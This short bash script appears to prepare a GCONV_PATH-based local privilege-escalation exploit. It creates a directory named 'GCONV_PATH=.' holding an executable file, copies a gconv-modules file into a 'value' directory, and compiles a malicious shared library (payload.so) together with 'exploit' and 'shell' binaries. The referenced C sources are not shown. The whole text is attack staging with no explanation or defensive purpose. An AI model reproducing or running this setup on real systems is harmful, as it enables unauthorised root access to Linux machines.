#!/usr/bin/env bash

mkdir -p "GCONV_PATH=."
touch "GCONV_PATH=./value"
chmod u+x "GCONV_PATH=./value"

mkdir -p value
cp ./gconv-modules value
gcc -shared -fPIC -o value/payload.so payload.c
gcc -o exploit exploit.c
gcc -o shell shell.c
